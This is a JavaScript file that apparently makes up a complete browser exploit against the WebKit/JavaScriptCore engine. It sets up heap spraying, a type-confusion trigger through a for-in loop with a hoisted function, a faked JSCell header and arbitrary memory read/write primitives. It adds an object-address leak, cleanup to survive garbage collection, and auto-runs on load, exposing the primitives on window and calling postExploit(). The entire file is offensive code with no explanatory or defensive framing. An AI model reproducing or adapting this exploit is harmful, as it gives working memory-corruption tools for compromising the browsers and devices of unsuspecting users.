function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

function int64(low, hi) {
    var conversionBuf = new ArrayBuffer(0x100);
    var u32 = new Uint32Array(conversionBuf);
    var f64 = new Float64Array(conversionBuf);


    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    };

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    };

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    };

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    };

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    };

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    };

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    };

    this.toPacked = function () {
        return {
            hi: this.hi,
            low: this.low
        };
    };

    this.setPacked = function (pck) {
        this.hi = pck.hi;
        this.low = pck.low;
        return this;
    };
    this.u2d = function () {
        u32[0] = this.low;
        u32[1] = this.hi;

        return f64[0];
    };
    this.asJSValue = function () {
        u32[0] = this.low;
        u32[1] = this.hi - 0x10000;
        return f64[0];
    };

    return this;
}

var STRUCTURE_SPRAY_SIZE = 0x1800;

var g_confuse_obj = null;
var g_arb_master = null;
var g_arb_slave = new Uint32Array(0x1000);
var g_leaker = {};
var g_leaker_addr = null;
var g_structure_spray = [];

var dub = new int64(0x41414141, 0x41414141).u2d();
var g_inline_obj = {
    a: dub,
    b: dub,
};

function spray_structs() {
    for (var i = 0; i < STRUCTURE_SPRAY_SIZE; i++) {
        var a = new Uint32Array(0x1);
        a["p" + i] = 0x1337;
        g_structure_spray.push(a); // keep the Structure objects alive.
    }

}

function trigger() {
    var o = {
        'a': 1
    };
    var test = new ArrayBuffer(0x100000);
    g_confuse_obj = {};
    var cell = {
        js_cell_header: new int64(0x00000800, 0x01182700).asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_inline_obj,
        len_and_flags: (new int64(0x00000020, 0x00010001)).asJSValue()
    };
    g_confuse_obj[0 + "a"] = cell;

    g_confuse_obj[1 + "a"] = {};
    g_confuse_obj[1 + "b"] = {};
    g_confuse_obj[1 + "c"] = {};
    g_confuse_obj[1 + "d"] = {};


    for (var j = 0x5; j < 0x20; j++) {
        g_confuse_obj[j + "a"] = new Uint32Array(test);
    }
    for (var k in o) {
        {
            k = {
                a: g_confuse_obj,
                b: new ArrayBuffer(test.buffer),
                c: new ArrayBuffer(test.buffer),
                d: new ArrayBuffer(test.buffer),
                e: new ArrayBuffer(test.buffer),
                1: new ArrayBuffer(test.buffer),

            };

            function k() {
                return k;
            }

        }

        o[k];

        if (g_confuse_obj["0a"] instanceof Uint32Array) {
            return;
        }
    }
}

function setup_arb_rw() {
    var jsCellHeader = new int64(0x00000800, 0x01182700);
    g_fake_container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_arb_slave,
        lengthAndFlags: (new int64(0x00000020, 0x00010000)).asJSValue()
    };

    g_inline_obj.a = g_fake_container;
    g_confuse_obj["0a"][0x4] += 0x10;
    g_arb_master = g_inline_obj.a;
    g_arb_master[0x6] = 0xFFFFFFF0;
}

function read(addr, length) {
    var a = new Uint8Array(length);
    for (var i = 0; i < length; i++) {
        a[i] = read8(addr.add32(i)).low & 0xFF;
    }
    return a;
}

function read8(addr) {
    if (!(addr instanceof int64))
        addr = new int64(addr);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    var retval = new int64(g_arb_slave[0] & 0xFF, 0);
    return retval;
}

function read32(addr) {
    if (!(addr instanceof int64))
        addr = new int64(addr);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    var retval = g_arb_slave[0];
    return retval;
}

function read64(addr) {
    if (!(addr instanceof int64))
        addr = new int64(addr);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    var retval = new int64(g_arb_slave[0], g_arb_slave[1]);

    return retval;
}

function write(addr, data) {
    addr_ = addr.add32(0);
    for (var i = 0; i < data.length; i++) {
        write8(addr_, data[i]);
        addr_.add32inplace(i);
    }
}

function write8(addr, val) {

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;
    var tmp = g_arb_slave[0] & 0xFFFFFF00;
    g_arb_slave[0] = val | tmp;
}

function write32(addr, val) {

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;

    g_arb_slave[0] = val;
}

function write64(addr, val) {
    if (!(val instanceof int64))
        val = new int64(val);

    g_arb_master[4] = addr.low;
    g_arb_master[5] = addr.hi;
    g_arb_slave[0] = val.low;
    g_arb_slave[1] = val.hi;
}

function setup_obj_leaks() {
    g_leaker.leak = false;
    g_inline_obj.a = g_leaker;
    g_leaker_addr = new int64(g_confuse_obj["0a"][4], g_confuse_obj["0a"][5]).add32(0x10);
}

function addrof(obj) {
    g_leaker.leak = obj;
    return read64(g_leaker_addr);
}

function cleanup() {


    var u32array = new Uint32Array(8);
    header = read(addrof(u32array), 0x10);

    // Set length to 0x10 and flags to 0x1
    // Will behave as OversizeTypedArray which can survive gc easily
    write32(addrof(g_arb_master).add32(0x18), 0x10);
    write32(addrof(g_arb_master).add32(0x1C), 0x1); //
    write32(addrof(g_confuse_obj['0a']).add32(0x18), 0x10);
    write32(addrof(g_confuse_obj['0a']).add32(0x1C), 0x1);
    write32(addrof(g_arb_slave).add32(0x1C), 0x1);
    var empty = {};
    header = read(addrof(empty), 0x8);
    write(addrof(g_fake_container), header);
}

function start_exploit() {
    spray_structs();
    trigger();
    setup_arb_rw();
    setup_obj_leaks();
}

start_exploit();

var prim = {
    write8: function (addr, val) {
        write64(addr, val);
    },

    write4: function (addr, val) {
        write32(addr, val);
    },

    read8: function (addr) {
        return read64(addr);
    },

    read4: function (addr) {
        return read32(addr);
    },

    leakval: function (jsval) {
        return addrof(jsval);
    },
};

window.primitives = prim;

postExploit();